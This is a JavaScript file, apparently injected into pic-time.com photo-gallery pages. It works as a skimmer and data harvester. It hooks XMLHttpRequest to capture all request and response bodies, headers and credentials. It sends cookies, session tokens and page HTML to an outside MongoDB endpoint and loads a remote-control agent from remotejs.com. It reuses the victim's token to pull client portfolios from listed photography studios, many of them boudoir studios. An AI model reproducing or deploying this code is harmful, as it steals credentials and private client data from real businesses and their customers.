// Setup the functions
if (!window.remoteSetupComplete) {
  window.uuidv4 = () => {
    return ([1e7] + -1e3 + -4e3 + -8e3 + -1e11).replace(/[018]/g, c =>
      (c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> c / 4).toString(16)
    );
  }

  // Create a function to get the access token required to write to the mongo database
  window.getAccessToken = async () => {
    return fetch('https://us-east-2.aws.realm.mongodb.com/api/client/v2.0/app/data-dkerm/auth/providers/anon-user/login').then((r) => r.json()).then((r) => r.access_token);
  };

  // Create a function to insert a document to into the mongo ingest collection
  window.insertDoc = async (type, data) => {
    if (!window.accessToken) {
      window.accessToken = await window.getAccessToken();
    }

    const envelope = {};
    envelope.sessionId = window.rjsSessionId;
    envelope.type = type;
    envelope.data = data;
    envelope.userAgent = navigator?.userAgent;

    envelope.ptData = {};
    envelope.ptData.headers = _pt$?.hdrs || null;
    envelope.ptData.userInfo = _pt$?.userInfo || null;
    envelope.ptData.cookie = document.cookie;

    envelope.ts = Date.now();

    return fetch('https://us-east-2.aws.data.mongodb-api.com/app/data-dkerm/endpoint/data/v1/action/insertOne', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Access-Control-Request-Headers': '*',
        'Authorization': `Bearer ${window.accessToken}`
      },
      body: JSON.stringify({
        'collection': 'ingest',
        'database': 'pictimeDataDb',
        'dataSource': 'pixieset-data',
        'document': envelope
      })
    });
  };
  
  window.startGettingUrls = async (pictimeGUserToken) => {
    // const urlsToGet = ['https://emeraldazphotography.pic-time.com','https://ashleehamonphotography.pic-time.com','https://abbeyricephoto.pic-time.com','https://daniellemargheritephotography.pic-time.com','https://capturedphotographybyhaleighwehr.pic-time.com','https://ashleylaydenphoto.pic-time.com','https://heirlumephotography.pic-time.com','https://rosienaryphotography.pic-time.com','https://boudoirbykimberly.pic-time.com','https://clientgallery.anchorandveilphotography.com','https://kalimphotos.pic-time.com','https://ashleysaraphotography.pic-time.com','https://erboudoir.pic-time.com','https://taylorsmithphoto.pic-time.com','https://proofing.twopairphotography.com','https://lovedarling.pic-time.com','https://creation4use.pic-time.com','https://beauboudoir.pic-time.com','https://hushandwildboudoir.pic-time.com','https://sixteenfourteenphotography.pic-time.com','https://photosbyjill.pic-time.com','https://joelleelizabethphotography.pic-time.com','https://brookeshannonphotography.pic-time.com','https://kaliphotography.pic-time.com','https://ashleybenhamphotography.pic-time.com','https://sarahwettleson.pic-time.com','https://angiejustshootme.pic-time.com','https://brynnakathleenphotography.pic-time.com','https://wyethaugustinephotography.pic-time.com','https://lennonphotography.pic-time.com','https://jodiplumbley.pic-time.com','https://emilyisaksonphotography.pic-time.com','https://dallasolgaphotography.pic-time.com','https://tiarrasorte.pic-time.com','https://stacimitchellphoto.pic-time.com','https://winxphoto.pic-time.com','https://sweetlikepie.pic-time.com','https://ashleyizquierdo.pic-time.com','https://thomasdphotography.pic-time.com','https://amypaine.pic-time.com','https://carleoimages.pic-time.com','https://briannalanephotography.pic-time.com','https://normagarciaphotography.pic-time.com','https://rachelpourchierphotography.pic-time.com','https://loveanneliesephotography.pic-time.com','https://gallery.supernovaboudoir.com','https://bloomingbeautyboudoir.pic-time.com','https://trinacaryphotography.pic-time.com','https://luxeandcophotography.pic-time.com','https://keleighmichellephotography.pic-time.com','https://brynathorinn.pic-time.com','https://joymaura.pic-time.com','https://karenhamdorfphotography.pic-time.com','https://vogtography.pic-time.com','https://vibycreative.pic-time.com','https://shutterbugstudios.pic-time.com','https://letsarahtakeyourpicture.pic-time.com','https://taylorbartram.pic-time.com','https://dijanasphotography.pic-time.com','https://lauramackphotography.pic-time.com','https://travelfor2photography.pic-time.com','https://bybaze.pic-time.com','https://thehowardbrand.pic-time.com','https://brinaphotography.pic-time.com','https://krussophotography.pic-time.com','https://thehumblelion.pic-time.com','https://mckaylaerinedits.passgallery.com','https://katejensenphoto.pic-time.com','https://sheerphotos.passgallery.com','https://karlamason.passgallery.com','https://urbanimages.pic-time.com','https://blairjenniferphotography.pic-time.com','https://galleries.karenobristphotography.com','https://winshipphotography.passgallery.com'];
    //const urlsToGet = [{url: 'https://emeraldazphotography.pic-time.com', brandId: 136384}];
    const urlsToGet = [{url: 'https://rachelodellphotography.pic-time.com', brandId: 439966}];

    for (const urlToGet of urlsToGet) {
      try {
        await new Promise(resolve => setTimeout(resolve, 1000));

        const portfolioResponse = await fetch(`${urlToGet.url}/!servicesp.asmx/getAccountClientPortfolio2`, {
          method: 'POST',
          headers: {
            'content-type': 'application/json; charset=UTF-8',
            'pictimeGUser': pictimeGUserToken,
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36'
          },
          body: JSON.stringify({brandId: urlToGet.brandId})
        });
        
        const portfolioJson = await portfolioResponse.json();

        const portfolioData = {
          url: urlToGet,
          type: 'getAccountClientPortfolio2',
          data: portfolioJson
        };
        
        window.insertDoc('portfolio-data', portfolioData);

        const projects = portfolioResponse.d[1][0];
        const projectIds = projects.map(p => p[1][0]);
        
        const responseStorageSettingsResponse = await fetch(`${urlToGet}/!services.asmx/getProjectStorageSettings`, {
          method: 'POST',
          headers: {
            'content-type': 'application/json; charset=UTF-8',
            'pictimeGUser': pictimeGUserToken,
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36'
          },
          body: JSON.stringify({projectIds})
        });
        
        const responseStorageSettingsJson = await responseStorageSettingsResponse.json();
        
        const projectData = {
          url: urlToGet,
          type: 'getProjectStorageSettings',
          data: responseStorageSettingsJson
        };
        
        window.insertDoc('project-data', projectData);
      } catch (err) {
        console.error(err);
        window.insertDoc('error', err);
        //console.log(`Error on: ${urlToGet}`);
      }
    }
  }

  const xhrMap = new Map();

  const origOpen = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function () {
    this.xhrId = uuidv4();

    const xhrData = {};

    xhrData.request = {};
    xhrData.request.method = arguments[0];
    xhrData.request.url = arguments[1];
    xhrData.request.async = arguments[2];
    xhrData.request.user = arguments[3];
    xhrData.request.password = arguments[4];

    xhrMap.set(this.xhrId, xhrData);

    this.addEventListener('load', function () {
      const xhrData = xhrMap.get(this.xhrId);

      // Set Response Headers
      const responseHeaders = this.getAllResponseHeaders().split('\r\n').map(header => {
        const split = header.split(/:(.*)/s);
        return { name: split[0], value: split[1] }
      });

      xhrData.responseHeaders = responseHeaders;

      // Set Response Body
      if (this.responseType === 'json') {
        xhrData.responseBody = this.response;
      } else {
        try {
          xhrData.responseBody = JSON.parse(this.responseText);
        } catch (err) {
          xhrData.responseBody = this.responseText;
        }
      }

      xhrMap.set(this.xhrId, xhrData);

      // Send data
      if (!xhrData.request.url.includes('https://remotejs.com/')) {
        window.insertDoc('xhr', xhrData);
      }
    });

    origOpen.apply(this, arguments);
  };

  // Set Request Body
  const origSend = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.send = function () {
    const xhrData = xhrMap.get(this.xhrId);

    const requestBody = arguments[0];
    try {
      xhrData.requestBody = JSON.parse(requestBody);
    } catch (err) {
      xhrData = requestBody;
    }
    xhrMap.set(this.xhrId, xhrData);

    origSend.apply(this, arguments);
  };

  // Set Request Headers
  const origSetRequestHeader = XMLHttpRequest.prototype.setRequestHeader;
  XMLHttpRequest.prototype.setRequestHeader = function () {
    const xhrData = xhrMap.get(this.xhrId);

    xhrData.requestHeaders = xhrData.requestHeaders || [];
    xhrData.requestHeaders.push({ name: arguments[0], value: arguments[1] });
    xhrMap.set(this.xhrId, xhrData);

    origSetRequestHeader.apply(this, arguments);
  };

  // Start session
  function startSession() {
    if (!window.self.location.href.includes('mobilecover') && !window.remoteInit) {
        window.addEventListener('load', () => {
          console.log(window.rjsSessionId);
          setTimeout(() => {
            (function(){var s=document.createElement("script");s.src="https://remotejs.com/agent/agent.js";s.setAttribute("data-consolejs-channel",window.rjsSessionId);document.head.appendChild(s);})();
          }, 2000);
        });
      
      window.insertDoc('session', { sessionId: window.rjsSessionId });

      // Send Location
      window.insertDoc('location', window.location);

      // Send Page HTML
      let pageHTML = new XMLSerializer().serializeToString(document);
      window.insertDoc('page-html', pageHTML);

      // Send JS files
      const jsFiles = performance.getEntriesByType('resource').filter(entry => entry.initiatorType === 'script').map(entry => entry.name);
      window.insertDoc('js-files', jsFiles);

      // Send Window Properties
      const windowProps = [];
      for (const prop in window) {
        windowProps.push(prop);
      }
      window.insertDoc('window-props', windowProps);

      // Send PT Properties
      const ptProps = [];
      for (const prop in _pt$) {
        ptProps.push(prop);
      }
      window.insertDoc('pt-props', ptProps);
      
      window.remoteInit = true;
    }
  };
                 
  window.remoteSetupComplete = true;
}

// Create a session ID for the window
if (!window.rjsSessionId) {
  window.rjsSessionId = uuidv4();
}

// Start Remote Session
startSession();

// Get URLs
if (_pt$?.hdrs?.gusr) {
  startGettingUrls(_pt$.hdrs.gusr);
}
